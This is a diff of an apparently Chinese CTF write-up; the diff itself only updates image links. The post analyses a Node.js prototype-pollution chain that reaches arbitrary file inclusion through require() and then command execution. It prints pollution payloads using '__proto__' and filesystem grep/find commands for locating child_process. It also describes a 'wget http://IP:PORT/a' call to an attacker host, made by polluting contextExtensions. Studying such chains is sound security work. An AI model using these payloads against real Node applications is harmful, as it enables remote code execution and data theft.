@@ -42,15 +42,15 @@ console.log('Validate your JSON with <a href="/?{}">query</a>');
 
 至于如何产生异常，方法是在JSON里面加一个项值为`null`，这样在遍历时`Object.entries(V)`为`null`，再调用`forEach`就会产生无法读取属性的异常。
 
-![](https://pic.hujiekang.top/uploads/big/1ef4c30af22e5395cbd91445867954cf.png)
+![](https://images.hujiekang.top/blogimage-1ef4c30af22e5395cbd91445867954cf-4cbb61f8.png)
 
 # `require()`任意文件包含执行
 
 使用WebStorm对源码进行调试，在catch处下断点，然后传入输入：`?{"a":null} ` ，使用Force Step Into（快捷键Alt+Shift+F7）即可跳转到`require()`的源码继续调试：
 
-![](https://pic.hujiekang.top/uploads/big/833303626430d6e575951907e6b00de9.png)
+![](https://images.hujiekang.top/blogimage-833303626430d6e575951907e6b00de9-e646a972.png)
 
-![](https://pic.hujiekang.top/uploads/big/e6504ae6d8855934525d3e417529666d.png)
+![](https://images.hujiekang.top/blogimage-e6504ae6d8855934525d3e417529666d-f1085e39.png)
 
 最终定位到`Module._load`方法：
 
@@ -136,7 +136,7 @@ Module._resolveFilename = function(request, parent, isMain, options) {
 
 随后是两个方法`trySelfParentPath`和`trySelf`：
 
-![](https://pic.hujiekang.top/uploads/big/e310b60a91d8bfff28a2804c33e0b9cb.png)
+![](https://images.hujiekang.top/blogimage-e310b60a91d8bfff28a2804c33e0b9cb-95c0698d.png)
 
 第一个方法参数不可控，返回的是调用`require()`方法的父模块路径，于是继续看第二个方法。
 
@@ -235,9 +235,9 @@ if (request === pkg.name) {
 {"__proto__":{"data":{"name":".","exports":""},"path":""},"a":null}
 ```
 
-![](https://pic.hujiekang.top/uploads/big/3f5ebe9bb15117386b5f8db9b73b62ff.png)
+![](https://images.hujiekang.top/blogimage-3f5ebe9bb15117386b5f8db9b73b62ff-1ba4ee05.png)
 
-![](https://pic.hujiekang.top/uploads/big/b18ce71c591fd1c390cfa9255ff40a03.png)
+![](https://images.hujiekang.top/blogimage-b18ce71c591fd1c390cfa9255ff40a03-2b59884a.png)
 
 最后是一段try block：
 
@@ -327,9 +327,9 @@ function isConditionalExportsMainSugar(exports, packageJSONUrl, base) {
 {"__proto__":{"data":{"name":".","exports":{"./usage":"any"}},"path":""},"a":null}
 ```
 
-![](https://pic.hujiekang.top/uploads/big/2378e91435bac40a6c08205addb3d597.png)
+![](https://images.hujiekang.top/blogimage-2378e91435bac40a6c08205addb3d597-d095a58f.png)
 
-![](https://pic.hujiekang.top/uploads/big/f3cae242b639f1dc4872bb3102d4b0a3.png)
+![](https://images.hujiekang.top/blogimage-f3cae242b639f1dc4872bb3102d4b0a3-c8bab681.png)
 
 ### 进入第二个`resolvePackageTarget`
 
@@ -382,11 +382,11 @@ let bestMatch = '';
 
 但是继续看下面的条件`packageSubpath.length >= key.length`，就可以发现第一个构造没法满足，因为这种情况下`key`最短只能是`.*`，去掉任何一个字符都会导致前面的判断没法通过，因此长度还是比`expansion`更大。因此只剩第二个能够通过：
 
-![](https://pic.hujiekang.top/uploads/big/c2b43394b905b1f50557b9bbab1dab91.png)
+![](https://images.hujiekang.top/blogimage-c2b43394b905b1f50557b9bbab1dab91-7df51ff9.png)
 
 调用：
 
-![](https://pic.hujiekang.top/uploads/big/5e920cf3569c413950c5dada4d290a06.png)
+![](https://images.hujiekang.top/blogimage-5e920cf3569c413950c5dada4d290a06-0d77215d.png)
 
 于是进入`resolvePackageTarget()`函数。如果按照上面的Payload，显然直接进入第一个判断，调用`resolvePackageTargetString()`函数。而如果exports是传入的数组，那么则会进入下面一个判断，递归继续对数组每一个元素调用`resolvePackageTarget()`，最终还是进入调用`resolvePackageTargetString()`函数。
 
@@ -476,11 +476,11 @@ function resolvePackageTargetString(
 
 解析结果：
 
-![](https://pic.hujiekang.top/uploads/big/b51fc69b9050c589ef89ba0d4995f26a.png)
+![](https://images.hujiekang.top/blogimage-b51fc69b9050c589ef89ba0d4995f26a-51457b4b.png)
 
 最终顺利包含执行文件（题目环境里无回显）：
 
-![](https://pic.hujiekang.top/uploads/big/b67e802fa2e4e0087d593608cdd7725d.png)
+![](https://images.hujiekang.top/blogimage-b67e802fa2e4e0087d593608cdd7725d-32e41744.png)
 
 ## Payload总结
 
@@ -502,7 +502,7 @@ grep -rnw --include="*.js" "child_process" / 2>/dev/null
 find / -name "*.js" -exec grep -H "child_process" {} \; 2>/dev/null
 ```
 
-![](https://pic.hujiekang.top/uploads/medium/7e4557d8de087ace329d9e9d4abb3c89.png)
+![](https://images.hujiekang.top/blogimage-7e4557d8de087ace329d9e9d4abb3c89-2987366d.png)
 
 搜索到如下文件：
 
@@ -672,17 +672,17 @@ module.exports = function opener(args, options, callback) {
 
 接下来看命令执行的参数。`process.argv`默认为node的执行参数，一般是`node <当前执行的JS文件>`（如下图），因此`process.argv.slice(2)`相当于空数组，且无法被污染。
 
-![](https://pic.hujiekang.top/uploads/big/70039966e61203b4c8573ac601e25194.png)
+![](https://images.hujiekang.top/blogimage-70039966e61203b4c8573ac601e25194-cb9c275d.png)
 
 但是无回显RCE需要带出命令输出，单控制一个可执行文件无法控制参数显然无法达到目的。
 
 直到看见另一个大佬写的EXP，恍然大悟，只能说思路太巧妙了：
 
-![](https://pic.hujiekang.top/uploads/big/427725a846af4e02d905dd1d977a6d45.png)
+![](https://images.hujiekang.top/blogimage-427725a846af4e02d905dd1d977a6d45-79d50856.png)
 
 他污染了一个名为`contextExtensions`的变量，一开始我还一头雾水，搜了一下发现这个变量是`vm.compileFunction()`方法中`options`参数中的一个属性：
 
-![](https://pic.hujiekang.top/uploads/big/0bf642c495128db1d96aeab0f5bda5bb.png)
+![](https://images.hujiekang.top/blogimage-0bf642c495128db1d96aeab0f5bda5bb-e81ef392.png)
 
 ### 污染`contextExtensions`注入变量的原理
 
@@ -719,7 +719,7 @@ Module.prototype.load = function(filename) {
 
 `findLongestRegisteredExtension()`是判断文件类型的函数，判断逻辑是只要文件后缀不在`Module._extensions`中则归为JS文件，否则直接返回对应类型。而`Module._extensions`中只有以下三种文件类型：
 
-![](https://pic.hujiekang.top/uploads/big/83098f9a2ae8d75edbeb82d1269eecba.png)
+![](https://images.hujiekang.top/blogimage-83098f9a2ae8d75edbeb82d1269eecba-9a0e79c4.png)
 
 所以只要包含的文件不是`.json`和`.node`后缀，都会进入`Module._extensions['.js']()`这个函数。这个函数的尾部调用了`Module._compile()`：
 
@@ -775,7 +775,7 @@ function wrapSafe(filename, content, cjsModuleInstance) {
 
 下图是WebStorm中展示的整个调用栈：
 
-![](https://pic.hujiekang.top/uploads/big/49f0892d48457f5da9600254ce0b8939.png)
+![](https://images.hujiekang.top/blogimage-49f0892d48457f5da9600254ce0b8939-c506d5cf.png)
 
 ### 注入上下文变量 控制命令执行参数
 
@@ -802,11 +802,11 @@ function wrapSafe(filename, content, cjsModuleInstance) {
 
 调试进入opener-bin.js，发现变量`process.argv`确实已经被覆盖了：
 
-![](https://pic.hujiekang.top/uploads/big/f8c6476ac197c87e76a19a2c9f639878.png)
+![](https://images.hujiekang.top/blogimage-f8c6476ac197c87e76a19a2c9f639878-ee6bb671.png)
 
 接下来进入`opener`调用，对应执行的命令就是`wget http://IP:PORT/a`（因为取了`slice`，`argv`前两个项应该置空，真实参数从第三项开始）
 
-![](https://pic.hujiekang.top/uploads/big/4861e69da2a77c9961b95adb9241d176.png)
+![](https://images.hujiekang.top/blogimage-4861e69da2a77c9961b95adb9241d176-174ffc34.png)
 
 # 参考资料
 
